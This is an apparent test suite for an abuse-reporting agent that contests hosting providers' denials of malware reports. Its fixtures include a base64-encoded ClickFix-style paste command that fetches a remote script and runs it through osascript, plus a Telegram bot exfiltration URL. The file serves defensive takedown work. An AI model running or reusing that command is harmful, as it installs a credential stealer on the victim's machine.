import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { createHash } from "node:crypto";
import sharp from "sharp";

import { useTemporaryDatabase } from "../../db/test_helpers";
import { validateAbuseReportRequest } from "../contracts";
import type { sendAbuseEmailRoute } from "../mail/send";
import { ProviderSubmissionRejectedError, type DecisionAnswer, type ProviderSubmissionProvider } from "../providers/submission_contracts";
import { AbuseRepository } from "../repository";
import { UnknownExternalStateError } from "../worker/shared";
import { capturedDocumentContent } from "../../website_archive/text";
import type { WebsiteArchiveResult, WebsiteVisitParams } from "../../website_archive/types";
import { scriptedVisitSession } from "../../site_visit/test_helpers";
import type { SiteCheckDependencies } from "../../liveness/check";
import type { DecisionAgentModel } from "./agent";
import { followUpProviderDecision } from "./decision";
import { SubmissionsEntity } from "../../db/entities/submissions";

useTemporaryDatabase();

const originalSecret = process.env.ABUSE_TRACKING_TOKEN_SECRET;
beforeAll(() => { process.env.ABUSE_TRACKING_TOKEN_SECRET = "decision-follow-up-test-secret-32-bytes!"; });
afterAll(() => {
	if (originalSecret === undefined) delete process.env.ABUSE_TRACKING_TOKEN_SECRET;
	else process.env.ABUSE_TRACKING_TOKEN_SECRET = originalSecret;
});

// Production case 375628583143477248: paneo.work hides its command in an install dialog;
// keychainagent.pro serves the payload only to curl. Cloudflare denied the page as no_abuse_found.
const COMMAND = `echo "https://apps.apple.com/app/paneo-install"; echo 'Y3VybCAtc2ZMIGh0dHBzOi8va2V5Y2hhaW5hZ2VudC5wcm8vd2tzeGdqL3daWkxSOXhZMjlvNCB8IG9zYXNjcmlwdCAtbCBKYXZhU2NyaXB0' | base64 -d | zsh`;
const PAGE = `<html><body><h1>Window Manager for Power Users</h1><a href="#download">Download for macOS</a>
<div class="install-modal" role="dialog" hidden><h2>Install Paneo</h2><p>1 Open Terminal</p><code>${COMMAND}</code></div></body></html>`;
const PNG = await sharp({ create: { width: 64, height: 48, channels: 3, background: "#ffffff" } }).png().toBuffer();

/**
 * A capture as the archive makes it: the live DOM holds the closed dialog;
 * the MHTML (Chrome leaves out what is not rendered) and the archive's HTML
 * and text, which keep only what a visitor sees, do not.
 */
function liveCapture(url: string): WebsiteArchiveResult {
	const visible = capturedDocumentContent(PAGE);
	return {
		requestedUrl: url,
		url,
		hostname: new URL(url).hostname,
		navigationHops: [{ index: 0, url, hostname: new URL(url).hostname, status: 200, contentCaptured: true }],
		archivedAt: new Date("2026-11-16T15:00:00Z"),
		route: "residential exit",
		userAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
		screenshotPng: PNG,
		mhtml: Buffer.from(`From: <Saved by Blink>\r\nSnapshot-Content-Location: ${url}\r\nContent-Type: text/html\r\n\r\n${visible.html}`),
		documentHtml: PAGE,
		html: Buffer.from(visible.html),
		text: Buffer.from(visible.text),
	};
}

/** The payload host as observed: curl gets the file, browsers a 404. */
const payloadHost = (async (input: URL | RequestInfo, init?: RequestInit) => {
	const agent = new Headers(init?.headers).get("user-agent") ?? "";
	return agent.startsWith("curl/") ? new Response("var loader = 1;", { headers: { "content-type": "application/octet-stream" } }) : new Response("not found", { status: 404 });
}) as typeof fetch;

/** A model that plays its turns in order, recording what it was given each time. */
function scripted(...turns: Array<Array<Record<string, unknown>>>) {
	const inputs: unknown[][] = [];
	const model: DecisionAgentModel = async ({ input }) => {
		inputs.push([...input]);
		const output = turns.shift();
		if (!output) throw new Error("The scripted model ran out of turns.");
		return { output };
	};
	return { model, inputs };
}
const call = (name: string, args: Record<string, unknown>, id = name) => ({ type: "function_call", call_id: id, name, arguments: JSON.stringify(args) });

async function deniedRoute(target: string, observedUrl: string, submissionId?: bigint) {
	const request = await validateAbuseReportRequest({ targets: [target], allegationCategory: "malware", description: "The page tells visitors to paste a command that installs a stealer.", observedUrls: [{ target, urls: [observedUrl] }] });
	const report = await AbuseRepository.createReport({ request, ...(submissionId !== undefined ? { submissionId } : {}), reporter: { reporterHeaders: { "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36" } } });
	const [reportTarget] = await AbuseRepository.listTargets(report.reportId);
	const route = await AbuseRepository.upsertResolvedRoute(reportTarget!.id, {
		routeKey: "provider_submission:cloudflare:contact", providerRegistryKey: "cloudflare", providerDisplayName: "Cloudflare Abuse",
		routeType: "provider_submission", resolverProvenance: { source: "test" }, resolutionSnapshot: { source: "test" }, status: "verified",
	});
	const run = await AbuseRepository.createProviderRun({ routeId: route.id, providerPayload: {}, correlationKey: `cf:${route.id.toString()}` });
	await AbuseRepository.settleProviderRun({ runId: run.id, executionStatus: "completed", routeStatus: "submitted", confirmationId: "35b8aafac3a6a6d9", submittedTargets: [target] });
	await AbuseRepository.recordProviderCorrespondence({ route, messages: [{ id: "response-1", subject: "[35b8aafac3a6a6d9]: Response to your Phishing report", body: "We could not detect any abusive or malicious content.", sentAt: new Date(), from: "Cloudflare Abuse" }] });
	return { reportId: report.reportId, route };
}

function recordingSend() {
	const sent: Array<Parameters<typeof sendAbuseEmailRoute>[0]> = [];
	const send = (async (params) => { sent.push(params); return { messageId: 1n, status: "sent", rfcMessageId: "<x@phishing.support>" }; }) as typeof sendAbuseEmailRoute;
	return { sent, send };
}

/** Liveness of a site that still resolves, is delegated normally and serves whoever asks. */
function liveness(overrides: { nameservers?: string[]; dns?: "resolves" | "servfail"; fetch?: typeof fetch } = {}): SiteCheckDependencies {
	const { nameservers = ["andy.ns.cloudflare.com"], dns = "resolves", fetch } = overrides;
	const answer = async () => {
		if (dns === "servfail") throw Object.assign(new Error("SERVFAIL"), { code: "ESERVFAIL" });
		return ["203.0.113.10"];
	};
	return {
		dns: { resolve4: answer, resolve6: async () => { throw Object.assign(new Error("ENODATA"), { code: "ENODATA" }); }, resolveCname: async () => [] },
		rdap: {
			rdapLocator: async (_object: string, value: string) => `https://rdap.registry.example/domain/${value}`,
			assertPublicHost: async () => undefined,
			httpRetryAttempts: 1,
			fetch: async () => new Response(JSON.stringify({ objectClassName: "domain", status: ["client transfer prohibited"], nameservers: nameservers.map((ldhName) => ({ ldhName })) }), { status: 200, headers: { "content-type": "application/rdap+json" } }),
		},
		...(fetch ? { fetch } : {}),
	};
}
const tools = { capture: async ({ url }: { url: string }) => liveCapture(url), fetch: payloadHost, assertPublicHost: async () => {}, timestamp: async () => undefined, liveness: liveness() };

describe("provider decision follow-up agent", () => {
	test("a page behind an entry's one-time link reaches the agent with the entry, the token's lifetime and the whole arrival", async () => {
		// Production case 381727464776274088: Cloudflare opened lbbvw.com/ without the session, saw the decoy and
		// denied; the agent then rechecked lbbvw.com/ itself, reached example.com and agreed. It never saw the entry.
		const entry = "https://f24ac216.37b963ba383fc01de7edcef8.workers.dev/";
		const ticket = "https://lbbvw.com/?dataXX0=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1cmwiOiJodHRwczovL2xiYnZ3LmNvbS8iLCJkb21haW4iOiJsYmJ2dy5jb20iLCJrZXkiOiJTUlZ3UWJuZjAzb2QiLCJxcmMiOm51bGwsImlhdCI6MTc5NTA3ODA2MCwiZXhwIjoxNzk1MDc4MTgwfQ.qAQe7AM6yZdPpNWwd5ao1NTlafcHGAFeYM_Ue6L02qA";
		const page = "https://lbbvw.com/";
		const hop = (index: number, url: string, status: number, redirectTo?: string) => ({ index, url, hostname: new URL(url).hostname, status, ...(redirectTo ? { redirectTo } : {}), contentCaptured: !redirectTo });
		await SubmissionsEntity.create({ id: 900n, kind: "website", dedupeKey: "entry", status: "redirected", data: { kind: "website", website: { url: entry, redirectSubmissionId: "901", navigationHops: [{ ...hop(0, entry, 200, entry), visitorStep: { submitted: [] } }, hop(1, entry, 302, ticket), hop(2, ticket, 302, page), hop(3, page, 200)] } } });
		// Reported before the gate was kept with the case: it is read from the arrival.
		await SubmissionsEntity.create({ id: 901n, kind: "website", source: "redirect:900", dedupeKey: "lbbvw", status: "reported", data: { kind: "website", website: { url: ticket, archiveUrl: page, navigationHops: [hop(0, ticket, 302, page), hop(1, page, 200)] } } });
		const { route } = await deniedRoute("lbbvw.com", page, 901n);
		const { model, inputs } = scripted([call("do_not_answer", { reason: "scripted" })]);

		await followUpProviderDecision({ routeId: route.id, state: "denied", detail: "no_abuse_found" }, { model, tools });

		const context = JSON.parse(((inputs[0]![0] as { content: Array<{ text: string }> }).content[0]!).text);
		expect(context.case.navigation).toEqual([
			{ url: entry, status: 200, redirectTo: entry, passedPageOfItsOwn: true },
			{ url: entry, status: 302, redirectTo: ticket },
			{ url: ticket, status: 302, redirectTo: page },
			{ url: page, status: 200, redirectTo: null },
		]);
		expect(context.case.accessGate).toEqual({ entryUrl: entry, entryStep: true, ticket: { url: ticket, issuedAt: "2026-11-19T08:47:40.000Z", expiresAt: "2026-11-19T08:49:40.000Z", lifetimeSeconds: 120 } });

		// A gate kept at report time, with its direct visit, is what the agent gets.
		const kept = { entryUrl: entry, entryStep: true, bareVisit: { url: page, reachedUrl: "https://href.li/?https://example.com", checkedAt: "2026-11-19T08:51:00.000Z" } };
		await SubmissionsEntity.setWebsiteField(901n, "accessGate", kept);
		const again = scripted([call("do_not_answer", { reason: "scripted" })]);
		await followUpProviderDecision({ routeId: route.id, state: "denied again" }, { model: again.model, tools, providerFor: () => ({ decisionFollowUp: { addressee: "Cloudflare", contestedStates: ["denied again"], channel: { kind: "email", replyAddress: "abusereply@cloudflare.com", subject: (id: string) => `[${id}]` } } }) as never });
		expect(JSON.parse(((again.inputs[0]![0] as { content: Array<{ text: string }> }).content[0]!).text).case.accessGate).toEqual(kept);
	});

	test("investigates with its tools, then sends its own answer exactly as written, with the screenshot it chose", async () => {
		const { reportId, route } = await deniedRoute("paneo.work", "https://paneo.work/");
		const { sent, send } = recordingSend();
		const text = "Hello Cloudflare Trust & Safety,\n\nThe install command sits in a dialog that only opens from the download button; it is still there.\n\nThank you,\nphishing.support";
		const { model, inputs } = scripted(
			[{ type: "reasoning", id: "r1", encrypted_content: "x" }, call("recheck_page", { url: "https://paneo.work/", device: "case" })],
			[call("fetch_url", { url: "https://keychainagent.pro/wksxgj/wZZLR9xY29o4", userAgent: "curl/8.7.1" }), call("fetch_url", { url: "https://keychainagent.pro/wksxgj/wZZLR9xY29o4", userAgent: "Mozilla/5.0" }, "fetch-browser")],
			[call("answer", { text, attachments: ["recheck-1.png", "missing.png"], summary: "The command still sits in the install dialog; asked them to open it." })],
		);

		expect(await followUpProviderDecision({ routeId: route.id, state: "denied", detail: "no_abuse_found" }, { model, tools, send })).toBe("sent");

		// The agent starts from the decision, the report and the whole correspondence.
		const context = JSON.parse(((inputs[0]![0] as { content: Array<{ text: string }> }).content[0]!).text);
		expect(context).toMatchObject({ provider: "Cloudflare", channel: { kind: "email", to: "abusereply@cloudflare.com" }, decision: { state: "denied", reason: "no_abuse_found" }, report: { receipt: "35b8aafac3a6a6d9", target: "paneo.work", allegation: "malware" } });
		expect(context.correspondence.map((message: { subject: string }) => message.subject)).toEqual(["[35b8aafac3a6a6d9]: Response to your Phishing report"]);
		// The recheck's result reached the model: the hidden dialog's command, decoded, and its screenshot.
		const recheck = JSON.parse((inputs[1]!.find((item) => (item as { type?: string }).type === "function_call_output") as { output: string }).output);
		expect(recheck).toMatchObject({ reached: true, route: "residential exit", screenshot: "recheck-1.png" });
		// Production 2026-11-16: macmorrow.app's command sits in a dialog that is `hidden` until a
		// click; the visible text lacks it, so the agent wrongly concluded the command was gone.
		expect(recheck.visiblePageText).not.toContain("base64");
		expect(recheck.fullDocumentText).toContain("1 Open Terminal");
		expect(recheck.pasteCommands[0].decoded).toEqual(["curl -sfL https://keychainagent.pro/wksxgj/wZZLR9xY29o4 | osascript -l JavaScript"]);
		// Each turn carries the previous turns, reasoning included.
		expect(inputs[1]).toContainEqual({ type: "reasoning", id: "r1", encrypted_content: "x" });
		const fetches = inputs[2]!.filter((item) => (item as { type?: string }).type === "function_call_output").slice(-2).map((item) => JSON.parse((item as { output: string }).output));

		expect(fetches.map(({ status }) => status)).toEqual([200, 404]);

		expect(sent).toHaveLength(1);
		expect(sent[0]).toMatchObject({ recipient: "abusereply@cloudflare.com", subject: "[35b8aafac3a6a6d9] Additional evidence for abuse report 35b8aafac3a6a6d9", body: text });
		// Only files that exist are attached.
		expect(sent[0]!.attachments!.map(({ filename }) => filename)).toEqual(["recheck-1.png"]);
		const events = await AbuseRepository.listEvents(reportId);
		expect(events.find((event) => event.eventType === "provider_decision.followed_up")?.data).toMatchObject({ to: "abusereply@cloudflare.com", summary: "The command still sits in the install dialog; asked them to open it." });
		const transcript = (await AbuseRepository.listArtifacts(reportId)).find((artifact) => artifact.kind === "decision_follow_up_transcript");
		expect(JSON.parse(Buffer.from(transcript!.blob).toString("utf8")).steps.map(({ tool }: { tool: string }) => tool)).toEqual(["recheck_page", "fetch_url", "fetch_url", "answer"]);
	});

	test("walks the site with the visiting agent and its instructions, and reads every page, data drop and download", async () => {
		const { route } = await deniedRoute("paneo.work", "https://paneo.work/");
		const { sent, send } = recordingSend();
		const visits: WebsiteVisitParams[] = [];
		let closed = 0;
		const bot = "https://api.telegram.org/bot8123456789:AAH-kit-token/sendMessage";
		const visitTools = {
			...tools,
			capture: async (options: { url: string; keepSession?: boolean }) => ({
				...liveCapture(options.url),
				...(options.keepSession ? {
					session: {
						...scriptedVisitSession({
							steps: [liveCapture("https://paneo.work/install")],
							requests: (canaries) => [{ timestamp: "", url: bot, method: "POST", postData: JSON.stringify({ text: `mail: ${canaries.email}` }) }],
							downloads: [{ url: "https://paneo.work/Paneo.dmg", fileName: "Paneo.dmg", contentType: "application/x-apple-diskimage", bytes: Buffer.from("dmg"), userAgent: "curl/8.7.1" }],
							agent: { actions: [{ id: "a1", kind: "click", text: "Clicked \"Download for macOS\"" }] },
						}, visits),
						close: async () => { closed++; },
					},
				} : {}),
			}),
		};
		const instructions = "Open the Download for macOS dialog and click the button inside it.";
		const { model, inputs } = scripted(
			[call("visit_site", { url: "https://paneo.work/", device: "case", instructions })],
			[call("answer", { text: "Hello Cloudflare,\n\nThe dialog still delivers the stealer.", attachments: ["visit-2.png"], summary: "Walked the dialog; it still delivers." })],
		);

		expect(await followUpProviderDecision({ routeId: route.id, state: "denied" }, { model, tools: visitTools, send })).toBe("sent");

		expect(visits.map((visit) => visit.instructions)).toEqual([instructions]);
		expect(closed).toBe(1);
		const visit = JSON.parse((inputs[1]!.find((item) => (item as { type?: string }).type === "function_call_output") as { output: string }).output);
		expect(visit.agent).toMatchObject({ outcome: "completed", actions: ["Clicked \"Download for macOS\""] });
		expect(visit.pages.map(({ finalUrl, screenshot }: { finalUrl: string; screenshot: string }) => ({ finalUrl, screenshot }))).toEqual([
			{ finalUrl: "https://paneo.work/", screenshot: "visit-1.png" },
			{ finalUrl: "https://paneo.work/install", screenshot: "visit-2.png" },
		]);
		expect(visit.pages[1].sentMadeUpData).toEqual([{ url: bot, method: "POST", fields: ["email"], sameSite: false }]);
		expect(visit.pages[1].downloads).toEqual([{ url: "https://paneo.work/Paneo.dmg", fileName: "Paneo.dmg", contentType: "application/x-apple-diskimage", bytes: 3, sha256: createHash("sha256").update("dmg").digest("hex") }]);
		expect(sent[0]!.attachments!.map(({ filename }) => filename)).toEqual(["visit-2.png"]);
	});

	test("an agent that decides not to answer sends nothing, records its reason, and is not asked again", async () => {
		const { reportId, route } = await deniedRoute("paneo.work", "https://paneo.work/");
		const { sent, send } = recordingSend();
		const first = scripted([call("do_not_answer", { reason: "The page no longer shows the command; Cloudflare is right." })]);
		expect(await followUpProviderDecision({ routeId: route.id, state: "denied", detail: "content_removed" }, { model: first.model, tools, send })).toBe("skipped");
		expect(sent).toEqual([]);
		expect((await AbuseRepository.listEvents(reportId)).find((event) => event.eventType === "provider_decision.not_answered")?.data).toMatchObject({ state: "denied", reason: "The page no longer shows the command; Cloudflare is right." });
		const again = scripted();
		expect(await followUpProviderDecision({ routeId: route.id, state: "denied" }, { model: again.model, tools, send })).toBe("skipped");
		expect(again.inputs).toHaveLength(0);
	});

	test("a model that stops talking is reminded to decide; one that never decides fails the job for a retry", async () => {
		const { route } = await deniedRoute("paneo.work", "https://paneo.work/");
		const { sent, send } = recordingSend();
		const reminded = scripted([{ type: "message", content: [{ type: "output_text", text: "Thinking." }] }], [call("do_not_answer", { reason: "Nothing new." })]);
		expect(await followUpProviderDecision({ routeId: route.id, state: "denied" }, { model: reminded.model, tools, send })).toBe("skipped");
		expect(JSON.stringify(reminded.inputs[1]!.at(-1))).toContain("Finish by calling answer or do_not_answer.");

		const other = await deniedRoute("paneo.work", "https://paneo.work/");
		const silent: DecisionAgentModel = async () => ({ output: [{ type: "message", content: [] }] });
		await expect(followUpProviderDecision({ routeId: other.route.id, state: "denied" }, { model: silent, tools, send })).rejects.toThrow("did not decide");
		expect(sent).toEqual([]);
	});
});

describe("a decision that says the content is gone", () => {
	// Production case 382161210906251264: nodeagent.pro served its payload only to curl; the registrar suspended
	// the domain two minutes after the report, Cloudflare denied it as content_removed, and the follow-up then
	// mailed "The content has not been removed" because a recheck still reached the old address.
	const PAYLOAD = "https://nodeagent.pro/ekgs7q/vjJlEWOTgJXq";
	const suspendedTools = { ...tools, liveness: liveness({ nameservers: ["ns1.domain-suspended.com", "ns2.domain-suspended.com"], dns: "servfail" }) };

	test("a suspended domain confirms the decision: nothing is sent and the agent is never asked", async () => {
		const { reportId, route } = await deniedRoute("nodeagent.pro", PAYLOAD);
		const { sent, send } = recordingSend();
		const never = scripted();
		expect(await followUpProviderDecision({ routeId: route.id, state: "denied", detail: "content_removed" }, { model: never.model, tools: suspendedTools, send })).toBe("skipped");
		expect(never.inputs).toHaveLength(0);
		expect(sent).toEqual([]);
		const event = (await AbuseRepository.listEvents(reportId)).find((item) => item.eventType === "provider_decision.not_answered");
		expect(event?.data).toMatchObject({ state: "denied", detail: "content_removed", confirmedByLiveness: true, liveness: [{ url: PAYLOAD, state: "domain_suspended" }] });
		expect((event?.data as { reason: string }).reason).toContain("confirmed by our own check");
		// Not asked again.
		expect(await followUpProviderDecision({ routeId: route.id, state: "denied" }, { model: never.model, tools: suspendedTools, send })).toBe("skipped");
	});

	test("a stale recheck that still reaches the payload does not matter: the registry's suspension decides", async () => {
		const { route } = await deniedRoute("nodeagent.pro", PAYLOAD);
		const { sent, send } = recordingSend();
		const stale = { ...tools, liveness: liveness({ nameservers: ["ns1.domain-suspended.com"], dns: "resolves", fetch: payloadHost }) };
		expect(await followUpProviderDecision({ routeId: route.id, state: "denied", detail: "The content is no longer visible." }, { model: scripted().model, tools: stale, send })).toBe("skipped");
		expect(sent).toEqual([]);
	});

	test("a cloaked payload host that is still delegated and served to curl is still contested", async () => {
		const { route } = await deniedRoute("nodeagent.pro", PAYLOAD);
		const { sent, send } = recordingSend();
		const served = { ...tools, liveness: liveness({ fetch: payloadHost }) };
		const { model, inputs } = scripted([call("answer", { text: "Hello Cloudflare,\n\nThe payload is still served to curl.", attachments: [], summary: "Still served." })]);
		expect(await followUpProviderDecision({ routeId: route.id, state: "denied", detail: "content_removed" }, { model, tools: served, send })).toBe("sent");
		expect(sent).toHaveLength(1);
		// The agent got our own check: the browser's 404 is not a takedown, the delegation is normal.
		const context = JSON.parse(((inputs[0]![0] as { content: Array<{ text: string }> }).content[0]!).text);
		expect(context.liveness).toEqual([{ url: PAYLOAD, state: "removed", detail: "HTTP 404.", registryStatuses: ["client transfer prohibited"], resolvedAddresses: ["203.0.113.10"] }]);
	});

	test("a denial that does not say the content is gone is not confirmed by a takedown, but the agent sees the suspension", async () => {
		const { route } = await deniedRoute("nodeagent.pro", PAYLOAD);
		const { model, inputs } = scripted([call("do_not_answer", { reason: "Suspended." })]);
		await followUpProviderDecision({ routeId: route.id, state: "denied", detail: "no_abuse_found" }, { model, tools: suspendedTools });
		expect(JSON.parse(((inputs[0]![0] as { content: Array<{ text: string }> }).content[0]!).text).liveness).toMatchObject([{ state: "domain_suspended" }]);
	});
});

describe("answering through a provider's form", () => {
	/** Eranet's supplement form as a test double: what it was given, and whether the answer was recorded first. */
	function formProvider(behave: (markSending: () => Promise<void>) => Promise<void> = (mark) => mark()) {
		const calls: Array<{ answer: DecisionAnswer; recordedBefore: boolean }> = [];
		const provider = {
			definition: { key: "cloudflare", displayName: "Eranet Fraud & Phishing Report" },
			decisionFollowUp: {
				contestedStates: ["supplement required"],
				addressee: "Eranet",
				channel: {
					kind: "form" as const,
					name: "Eranet's supplement form",
					requirements: "Requires at least one screenshot.",
					submit: async (answer: DecisionAnswer, markSending: () => Promise<void>) => {
						let recorded = false;
						await behave(async () => { await markSending(); recorded = true; });
						calls.push({ answer, recordedBefore: recorded });
					},
				},
			},
		} as unknown as ProviderSubmissionProvider;
		return { calls, providerFor: () => provider };
	}
	const answering = () => scripted([call("recheck_page", { url: "https://paneo.work/", device: "case" })], [call("answer", { text: "Hello Eranet,\n\nThe site still serves the stealer command.", attachments: ["recheck-1.png"], summary: "Still served." })]).model;
	const formAnswers = async (reportId: bigint) => (await AbuseRepository.listMailForReport(reportId)).filter((message) => message.kind === "provider_form");

	test("files the agent's answer through the form, recorded right before the filing request, once per decision", async () => {
		const { reportId, route } = await deniedRoute("paneo.work", "https://paneo.work/");
		const { calls, providerFor } = formProvider();
		const { model, inputs } = scripted([call("recheck_page", { url: "https://paneo.work/", device: "case" })], [call("answer", { text: "Hello Eranet,\n\nThe site still serves the stealer command.", attachments: ["recheck-1.png"], summary: "Still served." })]);
		expect(await followUpProviderDecision({ routeId: route.id, state: "supplement required", detail: "Based on the materials you have provided, we are unable to determine whether the website has committed any violations." }, { model, tools, providerFor })).toBe("sent");
		expect(JSON.parse(((inputs[0]![0] as { content: Array<{ text: string }> }).content[0]!).text).channel).toEqual({ kind: "form", name: "Eranet's supplement form", requirements: "Requires at least one screenshot." });
		expect(calls).toHaveLength(1);
		expect(calls[0]!.recordedBefore).toBeTrue();
		expect(calls[0]!.answer).toMatchObject({ confirmationId: "35b8aafac3a6a6d9", body: "Hello Eranet,\n\nThe site still serves the stealer command." });
		expect(calls[0]!.answer.attachments.map(({ filename }) => filename)).toEqual(["recheck-1.png"]);
		expect(await formAnswers(reportId)).toMatchObject([{ direction: "outbound", status: "sent", toAddresses: ["Eranet's supplement form"], correlationKey: `decision-follow-up:${route.id.toString()}:supplement required` }]);
		expect(await followUpProviderDecision({ routeId: route.id, state: "supplement required" }, { model: scripted().model, tools, providerFor })).toBe("skipped");
	});

	test("a failure before the filing request is retried; one of the request itself never is; a named refusal settles it", async () => {
		const before = await deniedRoute("paneo.work", "https://paneo.work/");
		await expect(followUpProviderDecision({ routeId: before.route.id, state: "supplement required" }, { model: answering(), tools, providerFor: formProvider(async () => { throw new Error("Eranet did not send its verification code"); }).providerFor })).rejects.toThrow("verification code");
		expect(await formAnswers(before.reportId)).toEqual([]);
		expect(await followUpProviderDecision({ routeId: before.route.id, state: "supplement required" }, { model: answering(), tools, providerFor: formProvider().providerFor })).toBe("sent");

		const during = await deniedRoute("paneo.work", "https://paneo.work/");
		await expect(followUpProviderDecision({ routeId: during.route.id, state: "supplement required" }, { model: answering(), tools, providerFor: formProvider(async (mark) => { await mark(); throw new Error("Eranet Supplement failed with HTTP 502"); }).providerFor })).rejects.toBeInstanceOf(UnknownExternalStateError);
		expect((await formAnswers(during.reportId)).map(({ status }) => status)).toEqual(["pending"]);
		const again = formProvider();
		expect(await followUpProviderDecision({ routeId: during.route.id, state: "supplement required" }, { model: answering(), tools, providerFor: again.providerFor })).toBe("skipped");
		expect(again.calls).toHaveLength(0);

		const refused = await deniedRoute("paneo.work", "https://paneo.work/");
		await expect(followUpProviderDecision({ routeId: refused.route.id, state: "supplement required" }, { model: answering(), tools, providerFor: formProvider(async (mark) => { await mark(); throw new ProviderSubmissionRejectedError("Eranet refused the supplement: VerifyCode.NotFound.Code"); }).providerFor })).rejects.toBeInstanceOf(ProviderSubmissionRejectedError);
		expect((await formAnswers(refused.reportId)).map(({ status, error }) => ({ status, error }))).toEqual([{ status: "failed", error: "Eranet refused the supplement: VerifyCode.NotFound.Code" }]);
	});
});
